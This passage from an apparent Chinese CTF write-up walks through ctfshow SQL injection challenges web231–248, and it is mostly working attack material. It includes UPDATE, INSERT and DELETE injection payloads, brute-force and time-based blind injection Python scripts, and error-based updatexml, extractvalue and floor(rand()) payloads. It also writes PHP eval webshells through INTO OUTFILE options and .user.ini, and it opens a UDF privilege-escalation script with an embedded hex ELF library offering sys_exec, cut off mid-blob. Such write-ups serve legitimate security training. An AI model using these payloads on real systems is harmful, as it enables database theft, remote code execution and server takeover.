<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">password=-1&#x27;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;username=</span><br><span class="line"></span><br><span class="line">password=-1&#x27;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flaga&#x27;)#&amp;username=</span><br><span class="line"></span><br><span class="line">password=-1&#x27;,username=(select flagas from flaga)#&amp;username=</span><br></pre></td></tr></table></figure>

<p>有个槽点就是这个东西只能慢慢的去看回显好像</p>
<p><img src="/../images/achieve/2025/4/ctfshowSql%E6%B3%A8%E5%85%A5/QQ20250502-141333.jpg" alt="1"></p>
<h2 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h2><p>闭合md5即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">password=&#x27;),username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;username=</span><br><span class="line"></span><br><span class="line">password=&#x27;),username=(select  group_concat(column_name) from information_schema.columns where table_name=&#x27;flagaa&#x27;)#&amp;username=</span><br><span class="line"></span><br><span class="line">password=&#x27;),username=(select flagass from flagaa)#&amp;username=</span><br></pre></td></tr></table></figure>

<h2 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h2><p>由于不能传入<code>&#39;</code>，这里我们需要绕过一下，但是还是很简单，我们利用<code>\</code>将<code>&#39;</code>转义即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#</span><br><span class="line"></span><br><span class="line">password=\&amp;username=,username=(select  group_concat(column_name) from information_schema.columns where table_name=&#x27;flag233333&#x27;)#</span><br><span class="line"></span><br><span class="line">password=\&amp;username=,username=(select flagass233 from flag233333)#</span><br></pre></td></tr></table></figure>

<h2 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#</span><br><span class="line"></span><br><span class="line">password=\&amp;username=,username=(select  group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)#</span><br><span class="line"></span><br><span class="line">password=\&amp;username=,username=(select flagass23s3 from flag23a)#</span><br></pre></td></tr></table></figure>

<h2 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h2><p>用<code>innodb_index_stats</code>和<code>innodb_table_stats</code>查找表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#</span><br><span class="line">banlist,ctfshow_user,flag23a1</span><br><span class="line"></span><br><span class="line">password=\&amp;username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)#</span><br></pre></td></tr></table></figure>

<p>这么看的话可能不是很好看懂，我再写个无列名注入的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select target_column from (SELECT 1, 2 AS target_column, 3 UNION SELECT * FROM flag23a1 limit 1,1)temp)#</span><br></pre></td></tr></table></figure>

<p>就很容易看懂了</p>
<h2 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select group_concat(table_name) from mysql.innodb_index_stats where database_name=database())#</span><br><span class="line"></span><br><span class="line">password=\&amp;username=,username=(select b from (select 1,2 as b,3 union select * from flaga limit 1,2)a)#</span><br></pre></td></tr></table></figure>

<h2 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h2><p>注入点在<code>/api/insert.php</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;insert into ctfshow_user(username,pass) value(&#x27;&#123;$username&#125;&#x27;,&#x27;&#123;$password&#125;&#x27;);&quot;;</span><br></pre></td></tr></table></figure>

<p><code>insert</code>注入来插入数据，一个注意的点就是不能覆盖数据，而且要多写个括号来闭合前面的<code>value</code>后面的<code>(</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">username=1&#x27;,(select group_concat(schema_name) from information_schema.schemata))#&amp;password=</span><br><span class="line"></span><br><span class="line">username=2&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()))#&amp;password=</span><br><span class="line"></span><br><span class="line">username=3&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;))#&amp;password=</span><br><span class="line"></span><br><span class="line">username=3&#x27;,(select flagass23s3 from flag))#&amp;password=</span><br></pre></td></tr></table></figure>

<h2 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h2><p>过滤了空格</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username=2&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()))#&amp;password=</span><br><span class="line"></span><br><span class="line">username=2&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flagb&#x27;))#&amp;password=</span><br><span class="line"></span><br><span class="line">username=3&#x27;,(select(group_concat(flag))from(ctfshow_web.flagb))#&amp;password=</span><br></pre></td></tr></table></figure>

<h2 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h2><p>抽象的是不能用注释绕过<code>/**/</code>只能用括号，<code>sys.schema_table_statistics_with_buffer</code>也不能使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username=5&#x27;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name)=database()))#&amp;password=</span><br><span class="line"></span><br><span class="line">username=6&#x27;,((select(b)from(select(1),(2)as(b),(3)union(select(flagbb)limit(0),(1)))a)))#&amp;password=</span><br><span class="line"></span><br><span class="line">username=6&#x27;,(select(group_concat(flag))from(ctfshow_web.flagbb)))#&amp;password=</span><br></pre></td></tr></table></figure>

<p>无列名注入也不能成功，直接猜flag</p>
<h2 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h2><p>爆破一下即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://62418365-713b-4401-b5bf-514ffc6611f5.challenge.ctf.show/api/insert.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a1 <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> a2 <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span>:</span><br><span class="line">        <span class="keyword">for</span> a3 <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span>:</span><br><span class="line">            <span class="keyword">for</span> a4 <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span>:</span><br><span class="line">                <span class="keyword">for</span> a5 <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span>:</span><br><span class="line">                    payload=<span class="string">&#x27;flag&#x27;</span>+a1+a2+a3+a4+a5</span><br><span class="line">                    data=&#123;</span><br><span class="line">                        <span class="string">&#x27;username&#x27;</span>:<span class="string">f&quot;1&#x27;,(select(flag)from(<span class="subst">&#123;payload&#125;</span>)))#&quot;</span>,</span><br><span class="line">                        <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;1&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    r=requests.post(url=url,data=data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;delete from  ctfshow_user where id = &#123;$id&#125;&quot;;</span><br></pre></td></tr></table></figure>

<p><code>delete</code>语句本身不会返回数据，所以我们这里需要进行时间盲注</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://027f52d9-f4d4-400e-abcb-55d154d072e5.challenge.ctf.show/api/delete.php&quot;</span></span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">right_time = <span class="number">0.8</span></span><br><span class="line">sleep=<span class="string">&quot;(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head + <span class="number">1</span> &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload=&quot;if((ascii(substr((select database()),&#123;0&#125;,1)))&lt;&#123;1&#125;,&#123;2&#125;,0)#&quot;.format(i,mid,sleep)</span></span><br><span class="line">        <span class="comment"># payload = &quot;if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1)))&lt;&#123;1&#125;,&#123;2&#125;,0)#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid,sleep)</span></span><br><span class="line">        <span class="comment"># banlist,ctfshow_user,flag</span></span><br><span class="line">        <span class="comment"># payload = &quot;if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),&#123;0&#125;,1)))&lt;&#123;1&#125;,&#123;2&#125;,0)#&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid, sleep)</span></span><br><span class="line">        <span class="comment"># id,flag</span></span><br><span class="line">        payload = <span class="string">&quot;if((ascii(substr((select flag from flag),&#123;0&#125;,1)))&lt;&#123;1&#125;,&#123;2&#125;,0)#&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            i, mid ,sleep)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: payload,</span><br><span class="line">        &#125;</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.post(url, data)</span><br><span class="line">        last_time = time.time() - start_time</span><br><span class="line">        <span class="keyword">if</span> last_time &gt; right_time:</span><br><span class="line">            tail = mid</span><br><span class="line">            <span class="comment"># print(&quot;right&quot;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            head = mid</span><br><span class="line">            <span class="comment"># print(&quot;wrong&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(target)</span><br></pre></td></tr></table></figure>

<h2 id="web242"><a href="#web242" class="headerlink" title="web242"></a>web242</h2><p>使用<code>lines terminated by\lines starting by\FIELDS TERMINATED BY\COLUMNS terminated by</code>插入恶意webshell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">filename=1.php&#x27; FIELDS TERMINATED BY &#x27;&lt;?php eval($_POST[1]); ?&gt;&#x27;;#</span><br><span class="line"></span><br><span class="line">filename=3.php&#x27; lines starting by &#x27;&lt;?php eval($_POST[1]); ?&gt;&#x27;;#</span><br><span class="line"></span><br><span class="line">filename=4.php&#x27; lines terminated by &#x27;&lt;?php eval($_POST[1]); ?&gt;&#x27;;#</span><br><span class="line"></span><br><span class="line">filename=8.php&#x27; COLUMNS terminated by &#x27;&lt;?php eval($_POST[1]); ?&gt;&#x27;;#</span><br></pre></td></tr></table></figure>

<h2 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filename=.user.ini&#x27; lines starting by &#x27;auto_prepend_file=1.txt\n&#x27;#</span><br><span class="line"></span><br><span class="line">filename=1.txt&#x27; lines starting by &#x27;&lt;?= eval($_POST[1]);?&gt;&#x27;#</span><br></pre></td></tr></table></figure>

<p>访问<code>/demp/</code>即可getshell</p>
<p><img src="/../images/achieve/2025/4/ctfshowSql%E6%B3%A8%E5%85%A5/QQ20250502-171712.jpg" alt="1"></p>
<h2 id="web244"><a href="#web244" class="headerlink" title="web244"></a>web244</h2><p>报错注入开始，<code>updatexml\extractvalue</code>，关键词的区别是<code>extractvalue(1,(查询语句))</code>和<code>updatexml(1,(查询语句),1)</code>，注意括号就好了，路由为<code>/api/</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/api/?id=1&#x27; or updatexml(1,concat(0x3d,mid((select group_concat(schema_name) from information_schema.schemata),32,32),0x3d),1)--+</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; or updatexml(1,concat(0x3d,mid((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;),1,32),0x3d),1)--+</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; or updatexml(1,concat(0x3d,mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flag&#x27;),1,32),0x3d),1)--+</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; or updatexml(1,concat(0x3d,mid((select group_concat(flag) from ctfshow_flag),1,32),0x3d),1)--+</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; or updatexml(1,concat(0x3d,mid((select group_concat(flag) from ctfshow_flag),32,32),0x3d),1)--+</span><br></pre></td></tr></table></figure>

<h2 id="web245"><a href="#web245" class="headerlink" title="web245"></a>web245</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/api/?id=1&#x27; or extractvalue(1,concat(0x3d,mid((select group_concat(schema_name) from information_schema.schemata),32,32),0x3d))--+</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; or extractvalue(1,concat(0x3d,mid((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;),1,32),0x3d))--+</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; or extractvalue(1,concat(0x3d,mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagsa&#x27;),1,32),0x3d))--+</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; or extractvalue(1,concat(0x3d,mid((select group_concat(flag1) from ctfshow_flagsa),1,32),0x3d))--+</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; or extractvalue(1,concat(0x3d,mid((select group_concat(flag1) from ctfshow_flagsa),32,32),0x3d))--+</span><br></pre></td></tr></table></figure>

<h2 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h2><p>报错原理：</p>
<ol>
<li>MySQL 在执行 GROUP BY 时，会为每个不同的 group 创建一个临时表</li>
<li><code>rand()</code> 会在查询执行过程中多次计算，而不是只计算一次</li>
<li>当 <code>rand()</code> 生成的值导致重复的键值出现时，MySQL 试图插入重复键到临时表时会产生错误</li>
</ol>
<p>所以有时候运气不好需要发好几次包才能成功</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/api/?id=1&#x27; union select 1,count(*),concat(mid((select group_concat(schema_name) from information_schema.schemata),32,32),0x7e,floor(rand()*2))a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; union select 1,count(*),concat((select schema_name from information_schema.schemata limit 4,1),0x7e,floor(rand()*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>

<p><code>limit\mid\right\left\substring</code>都是一样的其实，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/api/?id=1&#x27; union select 1,count(*),concat(mid((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;),1,32),0x7e,floor(rand()*2))a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; union select 1,count(*),concat(mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flags&#x27;),1,32),0x7e,floor(rand()*2))a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; union select 1,count(*),concat(mid((select group_concat(flag2) from ctfshow_flags),1,32),0x7e,floor(rand()*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>

<h2 id="web247"><a href="#web247" class="headerlink" title="web247"></a>web247</h2><blockquote>
<p>ceil()-向上取整函数<br>ceil(x) 返回不小于 x 的最小整数，即向上取整。<br>例如，ceil(3.14) 返回 4。</p>
<p>round() - 四舍五入函数<br>round(x) 返回最接近 x 的整数，如果有两个整数与 x 距离相等，则返回偶数的整数。<br>例如，round(3.6) 返回 4，round(3.5) 返回 4，round(3.4) 返回 3。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union select 1,count(*),concat(mid((select group_concat(schema_name) from information_schema.schemata),32,32),0x7e,round(rand()*2))a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; union select 1,count(*),concat(mid((select group_concat(schema_name) from information_schema.schemata),32,32),0x7e,ceil(rand()*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>

<p>正常写就行，最后一句有个小细节<code>flag?</code>要正确解析需要使用反引号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/api/?id=1&#x27; union select 1,count(*),concat(mid((select `flag?` from ctfshow_flagsa),1,32),0x7e,ceil(rand()*2))a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; union select 1,count(*),concat(mid((select `flag?` from ctfshow_flagsa),32,32),0x7e,ceil(rand()*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>

<h2 id="web248"><a href="#web248" class="headerlink" title="web248"></a>web248</h2><p>UDF提权</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考脚本</span></span><br><span class="line"><span class="comment"># 环境：Linux/MariaDB</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://1149521a-f0ba-48c5-adc6-4d6733e6a62e.challenge.ctf.show/api/?id=&#x27;</span></span><br><span class="line">code = <span class="string">&#x27;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFF